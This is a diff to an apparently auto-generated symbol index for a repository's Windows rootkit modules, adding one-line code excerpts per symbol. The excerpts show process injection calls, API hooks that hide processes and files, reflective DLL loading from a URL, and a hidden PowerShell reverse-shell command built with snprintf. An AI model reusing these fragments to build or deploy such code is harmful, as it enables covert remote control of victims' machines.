@@ -5,6 +5,8 @@
 - Doc: include <stdio.h> include <stdlib.h> include <string.h> include <unistd.h> include <winsock2.h> include <windows.h> incl
 - Language: c
 - Symbols:
+  - `Command` (struct, line 27)
+  - `VirtualFile` (struct, line 33)
   - `elp` (function, line 63) `void elp()`
   - `ensure_pid_file_exists` (function, line 85) `void ensure_pid_file_exists()`
   - `ensure_key_file_exists` (function, line 122) `void ensure_key_file_exists()`
@@ -13,13 +15,33 @@
   - `handle_client` (function, line 203) `DWORD WINAPI handle_client(LPVOID client_socket)`
   - `monitor_shell` (function, line 428) `DWORD WINAPI monitor_shell(LPVOID data)`
   - `main` (function, line 540) `int main()`
-  - `PORT` (macro, line 16)
-  - `BUFFER_SIZE` (macro, line 18)
-  - `MAX_COMMANDS` (macro, line 19)
-  - `PID_FILE` (macro, line 20)
-  - `HIDE_FILE` (macro, line 21)
-  - `KEY_FILE` (macro, line 22)
-  - `PASSWORD` (macro, line 24)
+  - `printf` (function, line 69) `printf("LD_PRELOAD setted as C:\\Windows\\System32\\mrhyde.dll\n");`
+  - `ZeroMemory` (function, line 73) `ZeroMemory(&si, sizeof(si));`
+  - `perror` (function, line 77) `perror("CreateProcess failed");`
+  - `exit` (function, line 78) `exit(EXIT_FAILURE);`
+  - `WaitForSingleObject` (function, line 80) `WaitForSingleObject(pi.hProcess, INFINITE);`
+  - `CloseHandle` (function, line 81) `CloseHandle(pi.hProcess);`
+  - `fclose` (function, line 94) `fclose(file);`
+  - `_pclose` (function, line 107) `_pclose(cmd);`
+  - `fprintf` (function, line 111) `fprintf(stderr, "Attempt %d: Failed to execute process check. Error: %s\n", current_attempt + 1, strerror(errno));`
+  - `Sleep` (function, line 114) `Sleep(1000 * (current_attempt + 1));`
+  - `WriteProcessMemory` (function, line 199) `WriteProcessMemory(hProcess, remoteMemory, &hModule, sizeof(hModule), NULL);`
+  - `CreateRemoteThread` (function, line 200) `CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)LoadLibrary, remoteMemory, 0, NULL);`
+  - `free` (function, line 206) `free(client_socket);`
+  - `closesocket` (function, line 218) `closesocket(sock);`
+  - `memset` (function, line 221) `memset(buffer, 0, BUFFER_SIZE);`
+  - `send` (function, line 246) `send(sock, error_msg, strlen(error_msg), 0);`
+  - `snprintf` (function, line 299) `snprintf(command, BUFFER_SIZE, "powershell -nop -W hidden -noni -ep bypass -c \"$TCPClient = New-Object Net.Sockets.TCPClient('%s', %d);`
+  - `_putenv_s` (function, line 390) `_putenv_s("LD_PRELOAD", "");`
+  - `time` (function, line 585) `time(&start_date);`
+  - `WSACleanup` (function, line 630) `WSACleanup();`
+  - `PORT` (macro, line 16) `#define PORT`
+  - `BUFFER_SIZE` (macro, line 18) `#define BUFFER_SIZE`
+  - `MAX_COMMANDS` (macro, line 19) `#define MAX_COMMANDS`
+  - `PID_FILE` (macro, line 20) `#define PID_FILE`
+  - `HIDE_FILE` (macro, line 21) `#define HIDE_FILE`
+  - `KEY_FILE` (macro, line 22) `#define KEY_FILE`
+  - `PASSWORD` (macro, line 24) `#define PASSWORD`
 
 ## modules/win_rootkit/mrhyde.c
 - Layer: utility
@@ -41,9 +63,23 @@
   - `HookedProcess32Next` (function, line 210) `BOOL WINAPI HookedProcess32Next(HANDLE hSnapshot, LPPROCESSENTRY32 lppe)`
   - `HookFunctions` (function, line 222) `void HookFunctions()`
   - `DllMain` (function, line 271) `BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)`
-  - `MAX_HIDE_PIDS` (macro, line 6)
-  - `PID_FILE_PATH` (macro, line 8)
-  - `FILE_HIDE_PATH` (macro, line 9)
+  - `FormatMessage` (function, line 29) `FormatMessage(FORMAT_MESSAGE_FROM_SYSTEM, NULL, error, 0, errorMsg, sizeof(errorMsg), NULL);`
+  - `fprintf` (function, line 30) `fprintf(stderr, "Error opening PID file: %s\n", errorMsg);`
+  - `fclose` (function, line 43) `fclose(file);`
+  - `Sleep` (function, line 56) `Sleep(1000 * (retry_count + 1));`
+  - `Process32First` (function, line 97) `Process32First(processesSnapshot, &processInfo);`
+  - `CloseHandle` (function, line 100) `CloseHandle(processesSnapshot);`
+  - `strcpy` (function, line 129) `strcpy(pe.szExeFile, "");`
+  - `printf` (function, line 141) `printf("Process hidden\n");`
+  - `sprintf` (function, line 150) `sprintf(pid_str, "%lu", pid);`
+  - `SetLastError` (function, line 173) `SetLastError(ERROR_FILE_NOT_FOUND);`
+  - `FindFirstFile` (function, line 176) `return FindFirstFile(lpFileName, lpFindFileData);`
+  - `FindNextFile` (function, line 185) `return FindNextFile(hFindFile, lpFindFileData);`
+  - `VirtualProtect` (function, line 229) `VirtualProtect(&originalFindFirstFile, sizeof(FARPROC), PAGE_READWRITE, &oldProtect);`
+  - `free` (function, line 284) `free(hide_pids[i]);`
+  - `MAX_HIDE_PIDS` (macro, line 6) `#define MAX_HIDE_PIDS`
+  - `PID_FILE_PATH` (macro, line 8) `#define PID_FILE_PATH`
+  - `FILE_HIDE_PATH` (macro, line 9) `#define FILE_HIDE_PATH`
 
 ## modules/win_rootkit/win_rin3_rootkit.cs
 - Layer: utility
@@ -65,6 +101,9 @@
 - Doc: include <stdio.h> include <stdlib.h> include <string.h> include <unistd.h> include <winsock2.h> include <windows.h> incl
 - Language: c
 - Symbols:
+  - `Command` (struct, line 28)
+  - `VirtualFile` (struct, line 34)
+  - `PIDArray` (struct, line 40)
   - `DownloadDLL` (function, line 78) `BOOL DownloadDLL(const char* url, PBYTE* buffer, DWORD* size)`
   - `ReflectiveLoadDLL` (function, line 98) `BOOL ReflectiveLoadDLL(PBYTE dllBuffer, DWORD dllSize)`
   - `initPIDArray` (function, line 146) `void initPIDArray(PIDArray *array)`
@@ -82,13 +121,44 @@
   - `handle_client` (function, line 524) `DWORD WINAPI handle_client(LPVOID client_socket)`
   - `monitor_shell` (function, line 753) `DWORD WINAPI monitor_shell(LPVOID data)`
   - `main` (function, line 865) `int main()`
-  - `PORT` (macro, line 17)
-  - `BUFFER_SIZE` (macro, line 19)
-  - `MAX_COMMANDS` (macro, line 20)
-  - `PID_FILE` (macro, line 21)
-  - `HIDE_FILE` (macro, line 22)
-  - `KEY_FILE` (macro, line 23)
-  - `PASSWORD` (macro, line 25)
+  - `void` (function, line 74) `typedef void (__cdecl *RunExperimentFunc)();`
+  - `BOOL` (function, line 77) `typedef BOOL(WINAPI *DllMainEntry)(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved);`
+  - `InternetCloseHandle` (function, line 85) `InternetCloseHandle(hInternet);`
+  - `memcpy` (function, line 107) `memcpy(baseAddress, dllBuffer, ntHeader->OptionalHeader.SizeOfHeaders);`
+  - `dllMain` (function, line 136) `dllMain((HINSTANCE)baseAddress, DLL_PROCESS_ATTACH, NULL);`
+  - `RunExperiment` (function, line 139) `RunExperiment();`
+  - `free` (function, line 163) `free(array->pids);`
+  - `strcpy` (function, line 168) `strcpy(command, "tasklist /FO CSV /NH");`
+  - `printf` (function, line 172) `printf("Error al ejecutar tasklist\n");`
+  - `_pclose` (function, line 187) `_pclose(pipe);`
+  - `RegCloseKey` (function, line 215) `RegCloseKey(hKey);`
+  - `strcat` (function, line 224) `strcat(valueData, dllPath);`
+  - `wcstombs_s` (function, line 254) `wcstombs_s(&converted, exeName, sizeof(exeName), processEntry.szExeFile, MAX_PATH);`
+  - `CloseHandle` (function, line 263) `CloseHandle(snapshot);`
+  - `GetModuleHandle` (function, line 289) `GetModuleHandle("kernel32.dll"), "LoadLibraryA" );`
+  - `VirtualFreeEx` (function, line 324) `VirtualFreeEx(hProcess, remoteDllPath, 0, MEM_RELEASE);`
+  - `WaitForSingleObject` (function, line 346) `WaitForSingleObject(hThread, INFINITE);`
+  - `GetExitCodeThread` (function, line 352) `GetExitCodeThread(hThread, &exitCode);`
+  - `ZeroMemory` (function, line 369) `ZeroMemory(&si, sizeof(si));`
+  - `perror` (function, line 373) `perror("CreateProcess failed");`
+  - `exit` (function, line 374) `exit(EXIT_FAILURE);`
+  - `fclose` (function, line 390) `fclose(file);`
+  - `fprintf` (function, line 407) `fprintf(stderr, "Attempt %d: Failed to execute process check. Error: %s\n", current_attempt + 1, strerror(errno));`
+  - `Sleep` (function, line 410) `Sleep(1000 * (current_attempt + 1));`
+  - `closesocket` (function, line 540) `closesocket(sock);`
+  - `memset` (function, line 543) `memset(buffer, 0, BUFFER_SIZE);`
+  - `send` (function, line 568) `send(sock, error_msg, strlen(error_msg), 0);`
+  - `snprintf` (function, line 621) `snprintf(command, BUFFER_SIZE, "powershell -nop -W hidden -noni -ep bypass -c \"$TCPClient = New-Object Net.Sockets.TCPClient('%s', %d);`
+  - `_putenv_s` (function, line 712) `_putenv_s("LD_PRELOAD", "");`
+  - `time` (function, line 912) `time(&start_date);`
+  - `WSACleanup` (function, line 957) `WSACleanup();`
+  - `PORT` (macro, line 17) `#define PORT`
+  - `BUFFER_SIZE` (macro, line 19) `#define BUFFER_SIZE`
+  - `MAX_COMMANDS` (macro, line 20) `#define MAX_COMMANDS`
+  - `PID_FILE` (macro, line 21) `#define PID_FILE`
+  - `HIDE_FILE` (macro, line 22) `#define HIDE_FILE`
+  - `KEY_FILE` (macro, line 23) `#define KEY_FILE`
+  - `PASSWORD` (macro, line 25) `#define PASSWORD`
 
 ## modules/win_rootkit/win_ring3_rootkit.cpp
 - Layer: utility
@@ -99,7 +169,16 @@
   - `hook_FindFirstFile` (function, line 75) `HANDLE WINAPI hook_FindFirstFile(CONST char* path, WIN32_FIND_DATA* find_data)`
   - `hook_CreateFile` (function, line 85) `HANDLE WINAPI hook_CreateFile(CONST char* path, DWORD access, DWORD share, LPSECURITY_ATTRIBUTES ...`
   - `DllMain` (function, line 93) `BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)`
-  - `HIDDEN_DIR` (macro, line 31)
-  - `HIDDEN_FILE` (macro, line 33)
-  - `HIDE_USER` (macro, line 34)
-  - `MAX_HIDE_PIDS` (macro, line 35)
+  - `CloseHandle` (function, line 50) `CloseHandle(hProcessSnap);`
+  - `SetLastError` (function, line 77) `SetLastError(ERROR_FILE_NOT_FOUND);`
+  - `original_FindFirstFile` (function, line 80) `return original_FindFirstFile(path, find_data);`
+  - `original_CreateFile` (function, line 90) `return original_CreateFile(path, access, share, security, creation, flags, template);`
+  - `DetourTransactionBegin` (function, line 96) `case DLL_PROCESS_ATTACH: DetourTransactionBegin();`
+  - `DetourUpdateThread` (function, line 98) `DetourUpdateThread(GetCurrentThread());`
+  - `DetourAttach` (function, line 99) `DetourAttach(&(PVOID&)original_FindFirstFile, hook_FindFirstFile);`
+  - `DetourTransactionCommit` (function, line 101) `DetourTransactionCommit();`
+  - `DetourDetach` (function, line 106) `DetourDetach(&(PVOID&)original_FindFirstFile, hook_FindFirstFile);`
+  - `HIDDEN_DIR` (macro, line 31) `#define HIDDEN_DIR`
+  - `HIDDEN_FILE` (macro, line 33) `#define HIDDEN_FILE`
+  - `HIDE_USER` (macro, line 34) `#define HIDE_USER`
+  - `MAX_HIDE_PIDS` (macro, line 35) `#define MAX_HIDE_PIDS`
